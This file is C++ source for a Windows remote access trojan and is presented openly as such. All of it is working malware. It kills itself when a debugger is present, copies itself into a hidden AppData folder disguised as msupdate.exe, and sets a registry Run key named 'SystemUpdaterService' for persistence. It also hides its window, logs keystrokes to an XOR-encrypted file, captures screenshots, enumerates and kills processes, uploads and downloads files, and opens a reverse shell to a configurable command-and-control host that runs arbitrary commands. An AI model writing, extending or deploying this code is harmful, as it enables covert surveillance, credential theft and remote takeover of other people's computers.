#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <sstream> // For process enumeration output

// Windows API and Winsock headers
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <gdiplus.h> 
#include <shlobj.h> // Required for SHGetFolderPathA to get AppData path
#include <tlhelp32.h> // Required for process enumeration

// Linker directives (IMPORTANT: Must be included during compilation)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "Shell32.lib") // Required for SHGetFolderPathA

// --- Configuration ---
// Change this to your public IP and desired port for the reverse connection
#define C2_IP "127.0.0.1"
#define C2_PORT 4444

// Hidden file names
const char* LOG_FILE_NAME = "sys_log.txt";
const char* SCREENSHOT_FILE_NAME = "screenshot.bmp";

// New executable name for stealth in the persistence location
const char* SELF_EXE_NAME = "msupdate.exe";

// --- Encryption Configuration ---
// Secret key for simple XOR obfuscation (must be the same for encryption/decryption)
const char ENCRYPTION_KEY[] = "L0VE"; 

// Simple XOR encryption/decryption function (applies to the data buffer in-place)
void XOR_EncryptDecrypt(std::vector<char>& data) {
    size_t key_len = strlen(ENCRYPTION_KEY);
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= ENCRYPTION_KEY[i % key_len];
    }
}

// --- Evasion & Persistence Functions ---

// Anti-Debugging: Checks if a debugger is attached.
void AntiDebugCheck() {
    if (IsDebuggerPresent()) {
        exit(0); 
    }
}

// Copies the current executable to a stealthy location and sets file attributes.
std::string CopyAndHideSelf() {
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath); 

    std::string stealthDir = std::string(appDataPath) + "\\MSData"; 
    CreateDirectoryA(stealthDir.c_str(), NULL);
    
    SetFileAttributesA(stealthDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    std::string newExePath = stealthDir + "\\" + SELF_EXE_NAME;

    CopyFileA(currentExePath, newExePath.c_str(), FALSE);

    SetFileAttributesA(newExePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return newExePath;
}

// Persistence: Writes the executable path to the registry's Run key
void EnablePersistence(const std::string& path_to_exe) {
    HKEY hkey;
    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegSetValueExA(hkey, 
                       "SystemUpdaterService", 
                       0, 
                       REG_SZ, 
                       (BYTE*)path_to_exe.c_str(), 
                       path_to_exe.length() + 1);
        RegCloseKey(hkey);
    }
}

// --- RAT Core Functions ---

// Helper: Gets the full path for a file in the user's temporary directory (for stealth)
std::string GetTempFilePath(const char* filename) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath) + filename;
}

// Structures for BMP file format (required for manual saving of the screen data)
typedef struct tagBITMAPFILEHEADER { 
    WORD    bfType; 
    DWORD   bfSize; 
    WORD    bfReserved1; 
    WORD    bfReserved2; 
    DWORD   bfOffBits; 
} BITMAPFILEHEADER, *PBITMAPFILEHEADER; 

// Function to save the captured HBITMAP to a BMP file
bool SaveBitmapToFile(HBITMAP hBitmap, HDC hDC, const char* full_path) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32; 
    bi.biCompression = BI_RGB;
    
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    
    std::vector<char> lpBitmap(dwBmpSize);
    
    GetDIBits(hDC, hBitmap, 0, (UINT)bmp.bmHeight, lpBitmap.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA(full_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    BITMAPFILEHEADER bfh;
    bfh.bfType = 0x4D42; 
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    DWORD dwBytesWritten = 0;
    
    WriteFile(hFile, &bfh, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    
    WriteFile(hFile, lpBitmap.data(), dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);
    return true;
}

// Main GDI screen capture logic
void CaptureScreenAndSave(const char* filename) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    std::string fullPath = GetTempFilePath(filename);
    SaveBitmapToFile(hBitmap, hMemoryDC, fullPath.c_str());

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}


// Keylogger: Runs in a separate thread to capture keystrokes
void Keylogger(SOCKET C2_Socket) {
    std::string logFilePath = GetTempFilePath(LOG_FILE_NAME);
    std::string buffer;
    const size_t MAX_BUFFER_SIZE = 50; // Write in chunks of 50 characters
    
    // Open file in binary mode for raw encrypted bytes
    std::ofstream logFile(logFilePath, std::ios::app | std::ios::binary); 
    if (!logFile.is_open()) {
        return; 
    }

    // Initial header is written encrypted
    std::string header = "\n--- New Session Started: " + std::string(__DATE__) + " " + std::string(__TIME__) + " ---\n";
    std::vector<char> header_data(header.begin(), header.end());
    XOR_EncryptDecrypt(header_data);
    logFile.write(header_data.data(), header_data.size());
    logFile.flush();

    // Main Keylogger Loop
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 

        for (int i = 1; i < 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                // Determine the character/key string and append to buffer
                std::string key_str;

                if (i >= 0x41 && i <= 0x5A) {
                    if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
                        key_str += (char)i; // Uppercase
                    } else {
                        key_str += (char)(i + 32); // Lowercase
                    }
                }
                else if (i >= 0x30 && i <= 0x39) {
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        char symbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
                        key_str += symbols[i - 0x30];
                    } else {
                        key_str += (char)i;
                    }
                }
                else {
                    switch (i) {
                        case VK_SPACE: key_str += ' '; break;
                        case VK_RETURN: key_str += "\n[ENTER]"; break;
                        case VK_TAB: key_str += "[TAB]"; break;
                        case VK_BACK: key_str += "[BACKSPACE]"; break;
                        case VK_LSHIFT: case VK_RSHIFT: case VK_CONTROL: case VK_MENU: 
                        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
                            // Ignore modifier keys
                            break;
                        default:
                            key_str += "[VK:0x" + std::to_string(i) + "]";
                            break;
                    }
                }
                
                // If a key was captured, append it to the buffer
                if (!key_str.empty()) {
                    buffer += key_str;
                }

                // If buffer is large enough, or an ENTER key was hit, flush the buffer (encrypt and write)
                if (buffer.size() >= MAX_BUFFER_SIZE || key_str.find("[ENTER]") != std::string::npos) {
                    if (!buffer.empty()) {
                         std::vector<char> data_to_write(buffer.begin(), buffer.end());
                         XOR_EncryptDecrypt(data_to_write); // ENCRYPT!
                         logFile.write(data_to_write.data(), data_to_write.size());
                         logFile.flush();
                         buffer.clear();
                    }
                }
            }
        }
    }
    logFile.close();
}


// Process Enumeration: Lists all running processes (new feature!)
std::string ProcessEnumeration() {
    std::stringstream ss;
    // Header for the output table
    ss << "PID\t\tProcess Name\n";
    ss << "--------------------------------\n";

    // Create a snapshot of all running processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return "ERROR: Failed to create process snapshot.\n";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process information
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return "ERROR: Failed to retrieve first process.\n";
    }

    // Loop through all processes
    do {
        // Output the Process ID and the executable file name
        ss << pe32.th32ProcessID << "\t\t" << pe32.szExeFile << "\n";
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return ss.str();
}

// NEW FEATURE: Terminates a process given its Process ID (PID)
std::string TerminateRemoteProcess(const std::string& pid_str) {
    DWORD pid;
    try {
        pid = std::stoul(pid_str); // Convert PID string to unsigned long (DWORD)
    } catch (...) {
        return "ERROR: Invalid PID format. Please provide a numerical ID.\n";
    }

    if (pid == 0) {
        return "ERROR: Cannot terminate PID 0 (System Idle Process).\n";
    }

    // Open the process with termination rights
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    
    if (hProcess == NULL) {
        std::stringstream ss;
        ss << "ERROR: Failed to open process PID " << pid << ". Access denied or PID not found.\n";
        return ss.str();
    }

    // Attempt to terminate the process
    if (TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        std::stringstream ss;
        ss << "SUCCESS: Process PID " << pid << " terminated successfully.\n";
        return ss.str();
    } else {
        DWORD error = GetLastError();
        CloseHandle(hProcess);
        std::stringstream ss;
        ss << "ERROR: Failed to terminate process PID " << pid << ". WinAPI Error Code: " << error << ".\n";
        return ss.str();
    }
}


// File Operations: Handles upload and download commands
void HandleFileCommand(SOCKET C2_Socket, const std::string& command) {
    if (command.length() > 6 && command.substr(0, 6) == "upload") {
        std::string filename = command.substr(7, command.find_last_of(' ') - 7);
        std::string content = command.substr(command.find_last_of(' ') + 1);
        
        std::string fullPath = filename;
        if (filename == LOG_FILE_NAME || filename == SCREENSHOT_FILE_NAME) {
             fullPath = GetTempFilePath(filename.c_str());
        }
        
        // Note: Uploads are currently saved as plain text. For full stealth, these should also be encrypted.
        std::ofstream outfile(fullPath);
        if (outfile.is_open()) {
            outfile << content;
            outfile.close();
            send(C2_Socket, "File uploaded successfully.\n", 28, 0);
        } else {
            send(C2_Socket, "ERROR: Could not create/open file for upload.\n", 45, 0);
        }
    } 
    else if (command.length() > 8 && command.substr(0, 8) == "download") {
        std::string filename = command.substr(9);
        
        std::string fullPath = filename;
        if (filename == LOG_FILE_NAME || filename == SCREENSHOT_FILE_NAME) {
             fullPath = GetTempFilePath(filename.c_str());
        }

        // Must use binary mode to read raw data, especially for encrypted files and BMPs
        std::ifstream infile(fullPath, std::ios::binary | std::ios::ate);
        if (infile.is_open()) {
            std::streamsize size = infile.tellg();
            infile.seekg(0, std::ios::beg);
            
            std::vector<char> buffer(size);
            if (infile.read(buffer.data(), size)) {
                
                // *** DECRYPTION LOGIC FOR KEYLOGGER FILE ***
                if (filename == LOG_FILE_NAME) {
                    XOR_EncryptDecrypt(buffer); 
                }
                // ******************************************

                // Send file size first, then the content (decrypted if it was the log file)
                std::string size_str = "FILE_START:" + std::to_string(buffer.size()) + "\n";
                send(C2_Socket, size_str.c_str(), size_str.length(), 0);
                send(C2_Socket, buffer.data(), buffer.size(), 0);
            } else {
                send(C2_Socket, "ERROR: Failed to read file contents.\n", 36, 0);
            }
            infile.close();
        } else {
            std::string error_msg = "ERROR: File not found or inaccessible at: " + fullPath + "\n";
            send(C2_Socket, error_msg.c_str(), error_msg.length(), 0);
        }
    } 
    else {
        send(C2_Socket, "Invalid file command. Use: upload <file> <content> or download <file>\n", 69, 0);
    }
}

// Screenshot Capture: Now fully implemented!
void CaptureScreenshot(SOCKET C2_Socket) {
    CaptureScreenAndSave(SCREENSHOT_FILE_NAME);

    send(C2_Socket, "Screenshot captured locally. Initiating download...\n", 52, 0);

    std::string downloadCommand = "download ";
    downloadCommand += SCREENSHOT_FILE_NAME;
    HandleFileCommand(C2_Socket, downloadCommand);
}


// Reverse Shell: Main command and control loop
void ReverseShell(SOCKET C2_Socket) {
    char buffer[4096];
    int bytesReceived;
    
    while ((bytesReceived = recv(C2_Socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        std::string command(buffer);
        command.erase(command.find_last_not_of(" \n\r\t")+1); 
        
        // Command parsing helper
        std::string cmd = command;
        std::string arg;
        size_t space_pos = command.find(' ');
        if (space_pos != std::string::npos) {
            cmd = command.substr(0, space_pos);
            arg = command.substr(space_pos + 1);
        }

        if (cmd == "quit" || cmd == "exit") {
            break;
        } else if (cmd == "screenshot") {
            CaptureScreenshot(C2_Socket);
        } else if (cmd == "file" || cmd.substr(0, 4) == "file") { // Handle 'file' commands
            HandleFileCommand(C2_Socket, command.substr(5));
        } else if (cmd == "get_log") {
            HandleFileCommand(C2_Socket, "download " + std::string(LOG_FILE_NAME));
        } else if (cmd == "ps") { 
            std::string process_list = ProcessEnumeration();
            send(C2_Socket, process_list.c_str(), process_list.length(), 0);
        } else if (cmd == "kill" && !arg.empty()) { // NEW: Process termination command
            std::string status = TerminateRemoteProcess(arg);
            send(C2_Socket, status.c_str(), status.length(), 0);
        } else { // Standard system shell command
            FILE* pipe = _popen(command.c_str(), "r");
            if (!pipe) {
                send(C2_Socket, "ERROR: Failed to execute command.\n", 34, 0);
                continue;
            }

            std::string result;
            char line[1024];
            while (fgets(line, sizeof(line), pipe) != NULL) {
                result += line;
            }
            _pclose(pipe);

            if (result.empty()) {
                 result = "Command executed successfully (no output).\n";
            }
            send(C2_Socket, result.c_str(), result.length(), 0);
        }
    }
}

// Main connection logic
void ConnectAndRun() {
    // 1. Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        return;
    }

    while (true) {
        SOCKET C2_Socket = INVALID_SOCKET;
        
        // 2. Create the socket
        C2_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (C2_Socket == INVALID_SOCKET) {
            closesocket(C2_Socket);
            WSACleanup();
            return;
        }

        // 3. Define the C2 server address
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_IP, &serverAddr.sin_addr.s_addr);

        // 4. Connect to the C2 server (Blocking call)
        if (connect(C2_Socket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(C2_Socket);
            // Long delay to avoid suspicion
            std::this_thread::sleep_for(std::chrono::seconds(30)); 
            continue; 
        }

        // 5. Connection established, start the two main threads
        std::thread keylogger_thread(Keylogger, C2_Socket);
        ReverseShell(C2_Socket);

        if (keylogger_thread.joinable()) {
            keylogger_thread.detach(); 
        }
        
        // 6. Close the socket after the shell disconnects
        closesocket(C2_Socket);
        std::this_thread::sleep_for(std::chrono::seconds(10)); 
    }

    WSACleanup();
}

int main() {
    // 1. IMMEDIATE Evasion: Check for debuggers and terminate if found
    AntiDebugCheck();

    // 2. STEALTH SETUP: Copy and hide the executable, then get the new path
    std::string persistedPath = CopyAndHideSelf();

    // 3. PERSISTENCE: Set the registry key to the new, hidden path
    EnablePersistence(persistedPath);

    // 4. Evasion: Hide Console Window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 5. CORE LOGIC: Start the connection loop
    ConnectAndRun();

    return 0;
}